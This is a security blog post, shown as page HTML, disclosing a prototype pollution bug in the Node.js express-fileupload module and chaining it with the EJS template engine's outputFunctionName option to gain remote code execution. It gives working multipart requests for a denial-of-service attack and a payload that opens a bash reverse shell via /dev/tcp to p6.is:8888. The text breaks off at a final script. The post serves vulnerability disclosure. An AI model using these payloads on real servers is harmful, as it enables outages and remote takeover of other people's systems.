<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="Real-world JS 1 Real-world JS Vulnerabilities Series 1  express-fileuploadJavaScript Vulnerabilities (prototype pollution, redos, type confusion etc) is a popular topic in recent security competition"><meta property="og:type" content="article"><meta property="og:title" content="Real-world JS - 1"><meta property="og:url" content="https://blog.p6.is/Real-World-JS-1/index.html"><meta property="og:site_name" content="POSIX"><meta property="og:description" content="Real-world JS 1 Real-world JS Vulnerabilities Series 1  express-fileuploadJavaScript Vulnerabilities (prototype pollution, redos, type confusion etc) is a popular topic in recent security competition"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729093633030.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729093731270.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729094135815.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729100022061.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729100528922.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729101543292.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729102550071.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729102347702.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729103038537.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729103132948.png"><meta property="og:image" content="https://blog.p6.is/img/2020/07/image-20200729104502663.png"><meta property="article:published_time" content="2020-07-29T02:29:02.000Z"><meta property="article:modified_time" content="2022-10-14T13:04:25.645Z"><meta property="article:author" content="posix"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.p6.is/img/2020/07/image-20200729093633030.png"><link rel="shortcut icon" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=16"><link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=192" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/b014d4712efdcda5c822e4ede732e29a?s=180"><title>Real-world JS - 1</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/rtl.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="POSIX" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fas fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li><li><a href="/category/">Category</a></li><li><a href="/search/">Search</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="/AST-Injection/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" href="/Review-of-2020-Defenit-CTF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/Real-World-JS-1/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/Real-World-JS-1/&text=Real-world JS - 1"><i class="fab fa-twitter" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Real-world-JS-1"><span class="toc-number">1.</span> <span class="toc-text">Real-world JS 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#express-fileupload"><span class="toc-number">1.1.</span> <span class="toc-text">express-fileupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-get-shell"><span class="toc-number">1.2.</span> <span class="toc-text">How to get shell?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.3.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol></div></span></div><div class="content index py4"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">Real-world JS - 1</h1><div class="meta"><span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">POSIX</span></span><div class="postdate">&nbsp;<time datetime="2020-07-29T02:29:02.000Z" itemprop="datePublished">2020-07-29</time></div>&nbsp;<div class="article-category">&nbsp;<i class="fas fa-archive"></i> <a class="category-link" href="/category/docs/">Docs</a></div>&nbsp;</div></header><div class="content" itemprop="articleBody"><h1 id="Real-world-JS-1"><a href="#Real-world-JS-1" class="headerlink" title="Real-world JS 1"></a>Real-world JS 1</h1><blockquote><p>Real-world JS Vulnerabilities Series 1</p></blockquote><h2 id="express-fileupload"><a href="#express-fileupload" class="headerlink" title="express-fileupload"></a>express-fileupload</h2><p>JavaScript Vulnerabilities (prototype pollution, redos, type confusion etc) is a popular topic in recent security competition such as CTFs<br>But, there seems to be a lack of real-world research for them, so I started research to find it and share data.</p><p>This research aims to improve the nodejs ecosystem security level.</p><p><img src="/img/2020/07/image-20200729093633030.png" alt="image-20200729093633030"></p><p>This vulnerability is in the first case about the <code>express-fileupload</code>.<br>As shown in the name, this module provide file upload function as <code>express middleware</code></p><p><img src="/img/2020/07/image-20200729093731270.png" alt="image-20200729093731270"></p><p>Until today, this <code>express-fileupload</code> has been downloaded a total of <code>7,193,433</code> times.</p><p><img src="/img/2020/07/image-20200729094135815.png" alt="image-20200729094135815"></p><p>The <code>express-fileupload</code> module provides several options for uploading and managing files in the nodejs application.<br>Among them, the <code>parseNested</code> make argument flatten.</p><p>Therefore, if we provide <code>&#123;&quot;a.b.c&quot;: true&#125;</code> as an input,<br>Internally, It will used as <code>&#123;&quot;a&quot;: &#123;&quot;b&quot;: &#123;&quot;c&quot;: true&#125;&#125;&#125;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">busboy.<span class="title function_">on</span>(<span class="string">&#x27;finish&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">debugLog</span>(options, <span class="string">`Busboy finished parsing request.`</span>);</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">parseNested</span>) &#123;</span><br><span class="line">        req.<span class="property">body</span> = <span class="title function_">processNested</span>(req.<span class="property">body</span>);</span><br><span class="line">        req.<span class="property">files</span> = <span class="title function_">processNested</span>(req.<span class="property">files</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req[waitFlushProperty]) <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">    <span class="title class_">Promise</span>.<span class="title function_">all</span>(req[waitFlushProperty])</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> req[waitFlushProperty];</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> req[waitFlushProperty];</span><br><span class="line">        <span class="title function_">debugLog</span>(options, <span class="string">`Error while waiting files flush: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">        <span class="title function_">next</span>(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>So, if <code>options.parseNested</code> has a value. If calls <code>processNested</code> Function, and argument will be <code>req.body</code> and <code>req.files</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">processNested</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data || data.<span class="property">length</span> &lt; <span class="number">1</span>) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> d = &#123;&#125;,</span><br><span class="line">        keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> key = keys[i],</span><br><span class="line">            value = data[key],</span><br><span class="line">            current = d,</span><br><span class="line">            keyParts = key</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/\[/g</span>), <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/\]/g</span>), <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; keyParts.<span class="property">length</span>; index++)&#123;</span><br><span class="line">            <span class="keyword">let</span> k = keyParts[index];</span><br><span class="line">            <span class="keyword">if</span> (index &gt;= keyParts.<span class="property">length</span> - <span class="number">1</span>)&#123;</span><br><span class="line">                current[k] = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!current[k]) current[k] = !<span class="built_in">isNaN</span>(keyParts[index + <span class="number">1</span>]) ? [] : &#123;&#125;;</span><br><span class="line">                current = current[k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The above is the full source of the <code>processNested</code> function.<br>Here provides <code>flatten</code> function for key, of <code>req.files</code>.</p><p>It split the key value of the first argument of object obtained through <code>Object.keys(data)</code> by <code>.</code><br>and makes loop using that, and refers&#x2F;define object repeatedly.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> some_obj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">`&#123;&quot;__proto__.polluted&quot;: true&#125;`</span>);</span><br><span class="line"><span class="title function_">processNested</span>(some_obj);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(polluted); <span class="comment">// true!</span></span><br></pre></td></tr></table></figure><p>In this function, prototype pollution vulnerability is caused by the above usage.<br>Therefore, if we can put manufactured objects in this function, it can affect the express web application.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileUpload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;express-fileupload poc&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">7777</span>)</span><br></pre></td></tr></table></figure><p>Therefore, configure and run the express server using <code>express-fileupload</code> in the above form.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=--------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">123</span></span><br><span class="line"></span><br><span class="line">----------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;name&quot;</span>; filename=<span class="string">&quot;filename&quot;</span></span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">----------<span class="number">1566035451</span>--</span><br></pre></td></tr></table></figure><p>And I send the above <code>POST</code> request.</p><p><img src="/img/2020/07/image-20200729100022061.png" alt="image-20200729100022061"></p><p>Then we can confirm that the some object is given as the argument of <code>processNested</code> function. (I added code for debug)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=--------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">137</span></span><br><span class="line"></span><br><span class="line">----------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;__proto__.toString&quot;</span>; filename=<span class="string">&quot;filename&quot;</span></span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">----------<span class="number">1566035451</span>--</span><br></pre></td></tr></table></figure><p>Let‚Äôs try <code>prototype pollution</code><br>If we send this with the name changed to <code>__proto__.toString</code>.</p><p><img src="/img/2020/07/image-20200729100528922.png" alt="image-20200729100528922"></p><p>An object with the key <code>__proto__.toString</code> is created and call processNested function.<br>and pollute <code>toString</code> method of <code>Object.prototype</code>.<br>And from the moment this value is covered with a object that is not a function.<br>The <code>express</code> application makes error for every request !</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isRegExp = <span class="keyword">function</span> <span class="title function_">isRegExp</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj) === <span class="string">&#x27;[object RegExp]&#x27;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>In the <code>qs</code> module used within the <code>express</code>, <code>location.search</code> part of the HTTP request will be parsed and make it to <code>req.query</code> object.<br>In that logic, <code>qs</code> uses <code>Object.prototype.toString</code>.<br>Therefore, this function called for every request in the express application (even if there is no search part)<br>If <code>Object.prototype.toString</code> can be polluted, this will cause an error.<br>and for every request, express always returns 500 error.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">&#x27;http://p6.is:7777&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.toString&#x27;</span>: <span class="string">&#x27;express-fileupload poc&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure><p>Actually, if we use script above to pollute the prototype of <code>server</code></p><p><img src="/img/2020/07/image-20200729101543292.png" alt="image-20200729101543292"></p><p>For all requests, the server returns either these error messages (development mode)<br>or only a blank screen and <code>500 Internal Server Error</code>! üòÆ</p><h2 id="How-to-get-shell"><a href="#How-to-get-shell" class="headerlink" title="How to get shell?"></a>How to get shell?</h2><p>We can already make a DOS, but everyone wants a shell.<br>So, I‚Äôll describe one way to acquire shell through the vulnerability above.</p><p><img src="/img/2020/07/image-20200729102550071.png" alt="image-20200729102550071"></p><p>The simplest way to obtain shell through <code>prototype solution</code> in the express application is by using the <code>ejs</code>.<br>Yes, There is a limitation to whether the application should be using the <code>ejs template engine</code></p><p><img src="/img/2020/07/image-20200729102347702.png" alt="image-20200729102347702"></p><p>But the EJS is the most popular template engine for the nodejs<br>and also used very often in combination with the express.</p><p>If this vulnerability exists, you can bet on this. (no guaranteed üòè)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileUpload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">fileUpload</span>(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">polluted</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index.ejs&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">7777</span>);</span><br></pre></td></tr></table></figure><p>The above is an example of using the ejs module.<br>There was only one line change in replacing the rendering engine.</p><p>Because the parseNested option is still active, we can still pollute prototype.<br>Unlike the above here, I will use <code>req.body</code> object.</p><p>Because we can manipulated the value of that as string.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------1566035451</span><br><span class="line">Content-Length: 137</span><br><span class="line"></span><br><span class="line">----------1566035451</span><br><span class="line">Content-Disposition: form-data; name=&quot;__proto__.polluted&quot;;</span><br><span class="line"></span><br><span class="line">content</span><br><span class="line">----------1566035451--</span><br></pre></td></tr></table></figure><p>Similar with above, but the <code>filename</code>of <code>Content-Disposition</code> has been deleted.<br>Then the value will go to <code>req.body</code> not <code>req.files</code>.</p><p><img src="/img/2020/07/image-20200729103038537.png" alt="image-20200729103038537"><img src="/img/2020/07/image-20200729103132948.png" alt="image-20200729103132948"></p><p>By checking the values that enter the <code>processNested</code> function<br>You can see that the values that were previously objects is now string.</p><p>pollution happens the same as before.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Template</span>(<span class="params">text, opts</span>) &#123;</span><br><span class="line">  opts = opts || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> options = &#123;&#125;;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">templateText</span> = text;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">string | null</span>&#125; */</span></span><br><span class="line">  ...</span><br><span class="line">  options.<span class="property">outputFunctionName</span> = opts.<span class="property">outputFunctionName</span>;</span><br><span class="line">  options.<span class="property">localsName</span> = opts.<span class="property">localsName</span> || <span class="built_in">exports</span>.<span class="property">localsName</span> || _DEFAULT_LOCALS_NAME;</span><br><span class="line">  options.<span class="property">views</span> = opts.<span class="property">views</span>;</span><br><span class="line">  options.<span class="property">async</span> = opts.<span class="property">async</span>;</span><br></pre></td></tr></table></figure><p>The target value to pollute is the <code>outputFunctionName</code>, which is an option in the ejs rendering function.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">compile</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">string</span>&#125; */</span></span><br><span class="line">  <span class="keyword">var</span> src;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">ClientFunction</span>&#125; */</span></span><br><span class="line">  <span class="keyword">var</span> fn;</span><br><span class="line">  <span class="keyword">var</span> opts = <span class="variable language_">this</span>.<span class="property">opts</span>;</span><br><span class="line">  <span class="keyword">var</span> prepended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> appended = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">EscapeCallback</span>&#125; */</span></span><br><span class="line">  <span class="keyword">var</span> escapeFn = opts.<span class="property">escapeFunction</span>;</span><br><span class="line">  <span class="comment">/** <span class="doctag">@type</span> &#123;<span class="type">FunctionConstructor</span>&#125; */</span></span><br><span class="line">  <span class="keyword">var</span> ctor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">source</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">generateSource</span>();</span><br><span class="line">    prepended +=</span><br><span class="line">      <span class="string">&#x27;  var __output = &quot;&quot;;\n&#x27;</span> +</span><br><span class="line">      <span class="string">&#x27;  function __append(s) &#123; if (s !== undefined &amp;&amp; s !== null) __output += s &#125;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">      prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">destructuredLocals</span> &amp;&amp; opts.<span class="property">destructuredLocals</span>.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> destructuring = <span class="string">&#x27;  var __locals = (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;),\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; opts.<span class="property">destructuredLocals</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> name = opts.<span class="property">destructuredLocals</span>[i];</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          destructuring += <span class="string">&#x27;,\n  &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        destructuring += name + <span class="string">&#x27; = __locals.&#x27;</span> + name;</span><br><span class="line">      &#125;</span><br><span class="line">      prepended += destructuring + <span class="string">&#x27;;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (opts.<span class="property">_with</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">      prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    appended += <span class="string">&#x27;  return __output;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">source</span> = prepended + <span class="variable language_">this</span>.<span class="property">source</span> + appended;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>The ejs makes Function for implement their template and executing<br>and the <code>outputFunctionName</code> option used in the process is included in the function.</p><p>Therefore, if we can manipulate this value, any command can be executed.</p><p>This technique was introduced by a Chinese CTF in 2019.<br>Please refer to <a target="_blank" rel="noopener" href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs">here</a> for details.</p><p>That part has not been patched so far, and it is expected to remain in the future.<br>So we can take advantage of it.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: multipart/form-data; boundary=--------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">221</span></span><br><span class="line"></span><br><span class="line">----------<span class="number">1566035451</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;__proto__.outputFunctionName&quot;</span>;</span><br><span class="line"></span><br><span class="line">x;process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1&quot;&#x27;</span>);x</span><br><span class="line">----------<span class="number">1566035451</span>--</span><br></pre></td></tr></table></figure><p>So first, we‚Äôre going to pollute the <code>Object.prototype.outputFunctionName</code> using the <code>prototype pollution</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: p6.is:7777</span><br></pre></td></tr></table></figure><p>and calls template function of ejs.</p><p><img src="/img/2020/07/image-20200729104502663.png" alt="image-20200729104502663"></p><p>Then we can get the shell !<br>If all the process can be represented by python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 